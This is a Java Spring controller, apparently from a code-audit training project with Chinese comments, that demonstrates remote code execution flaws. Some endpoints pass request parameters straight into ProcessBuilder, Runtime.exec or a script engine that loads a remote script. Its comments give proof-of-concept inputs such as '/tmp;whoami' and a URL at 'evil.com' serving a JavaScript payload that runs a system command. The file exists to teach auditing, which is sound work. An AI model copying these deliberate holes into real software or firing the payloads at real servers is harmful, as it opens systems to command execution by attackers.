package org.async.codeaudit.controller.audit;

import lombok.extern.slf4j.Slf4j;
import org.async.codeaudit.common.R;
import org.async.codeaudit.common.Security;
import org.async.codeaudit.service.RCEService;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.regex.Pattern;

@RestController
@RequestMapping("/rce")
@Slf4j
public class RCEController {
    private RCEService rceService;
    /**
     * RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:
     * - 命令注入（Command Injection），在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入
     * - 代码注入（Code Injection），在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。
     * 避免不可信数据拼接操作系统命令
     *  当不可信数据存在时，应尽量避免外部数据拼接到操作系统命令使用 Runtime 和 ProcessBuilder 来执行。优先使用其他同类操作进行代替，比如通过文件系统API进行文件操作而非直接调用操作系统命令。
     *  这个是面向java本身的，而且审计也相对于容易
     * RCE需要关注的函数
     *  1. ProcessBuilder类: new ProcessBuilder(cmdArray).start()
     *  2. Runtime类：Runtime.getRuntime().exec()
     *  3. groovy类//这个要不要审计呢？
     * @param file
     * @return
     */
    /**
     * rce漏洞属于大型漏洞有多种
     * 不过我们作为审计
     * 其实不必要管他的结果，既造成命令执行，和代码注入
     * 我们只需要关注成因就可以了
     * 但是java第三方库又多
     * 很难鉴别，不如之前的log4jRCE漏洞
     * 我们这里就只审计java本地方法
     * 一个是ProcessBuilder
     * 另一个是Runtime
     * ProcessBuilder
     */
    @PostMapping("/code")
    public R<String> code(MultipartFile file){
        //这里一样进行预处理
        if(file.isEmpty())return  R.error("文件为空！");
        BufferedReader bufferedReader= null;
        log.info(file.toString());
        String code=null;
        R<String> res=null;
        try {
            bufferedReader = new BufferedReader(new InputStreamReader(file.getInputStream()));
            StringBuilder temp=new StringBuilder();
            while((code=bufferedReader.readLine())!=null){
                temp.append(code);
            }
            code=temp.toString();
            bufferedReader.close();
            Pattern pattern = Pattern.compile("Runtime\\.getRuntime\\(\\)\\.exec\\((.+)\\);");
            if(pattern.matcher(code).find())res=rceService.runtimeCode(code);
            else res=rceService.pbCode(code);
        } catch (IOException e) {
            e.printStackTrace();
        }
         return  res;
    }
    /**
     * @vul 调用ProcessBuilder执行ls命令，接收参数filepath，拼接命令语句
     * @poc http:///rce/study/processBuilder?filepath=/tmp;whoami
     */
    @GetMapping("study/processBuilder")
    public static String cmd(String filepath) {
        // 提供一个命令字典
        String[] cmdList = {"sh", "-c", "ls -l " + filepath};
        StringBuilder sb = new StringBuilder();
        String line;

        // 利用指定的操作系统程序和参数构造一个进程生成器
        ProcessBuilder pb = new ProcessBuilder(cmdList);
        pb.redirectErrorStream(true);

        // 使用此进程生成器的属性启动一个新进程
        Process process = null;
        try {
            System.out.println("[Vul] 执行ProcessBuilder：" + filepath);
            process = pb.start();
            // 取得命令结果的输出流
            InputStream fis = process.getInputStream();
            // 用一个读输出流类去读
            InputStreamReader isr = new InputStreamReader(fis);
            // 用缓存器读行
            BufferedReader br = new BufferedReader(isr);
            //直到读完为止
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return sb.toString();
    }

    /**
     * @vul 使用Runtime.getRuntime().exec()执行命令
     * @poc http:///study/rce/runtime?cmd=id
     */
    @GetMapping("study/runtime")
    public static String cmd2(String cmd) {
        StringBuilder sb = new StringBuilder();
        String line;

        try {
            // 执行命令
            Process proc = Runtime.getRuntime().exec(cmd);
            System.out.println("[Vul] 执行runtime：" + cmd);

            InputStream fis = proc.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
        return sb.toString();
    }


    /**
     * @safe 这种方式不存在命令执行
     */
    @RequestMapping("study/runtime2")
    public static void cmd3(String cmd) {
        String test = ";echo 1 > 1.txt";
        String Command = "ping 127.0.0.1" + test;

        try {
            Runtime.getRuntime().exec(Command);
        } catch (IOException e) {
            e.printStackTrace();
        }
        //Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", Command});
    }

   /* /**
     * @vul `groovy`执行命令
     * @poc http://127.0.0.1:8888/RCE/groovy?cmd="open -a Calculator".execute()

    @GetMapping("/groovy")
    public void groovy(String cmd) {
        GroovyShell shell = new GroovyShell();
        shell.evaluate(cmd);
    }  */


    /**
     * @vul 调用远程js脚本程序进行封装
     * @poc http://127.0.0.1:8888/RCE/js?url=http://evil.com/java/1.js
     * js代码：var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     */
    @GetMapping("study/js")
    public String jsEngine(String url) {
        try {
            // 通过脚本名称获取
            // ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
            // 通过文件扩展名获取
            ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
            // Bindings：用来存放数据的容器
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
            String payload = String.format("load('%s')", url);
            System.out.println("[Vul] " + payload);
            engine.eval(payload, bindings);
            return "漏洞执行成功";
        } catch (Exception e) {
            return "加载远程脚本: " + url;
        }
    }

    /*
     * JShell
     */

    @RequestMapping("study/processBuilder/safe")
    public static String processBuilderSafe(String filepath) {

        if (! Security.checkOs(filepath)) {

            String[] cmdList = {"sh", "-c", "ls -l " + filepath};
            StringBuilder sb = new StringBuilder();
            String line;

            ProcessBuilder pb = new ProcessBuilder(cmdList);
            pb.redirectErrorStream(true);

            Process process = null;
            try {
                process = pb.start();
                InputStream fis = process.getInputStream();
                InputStreamReader isr = new InputStreamReader(fis);
                BufferedReader br = new BufferedReader(isr);

                while ((line = br.readLine()) != null) {
                    System.out.println(line);
                    sb.append(line);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            return sb.toString();
        } else {
            return "检测到非法命令注入";
        }
    }


}
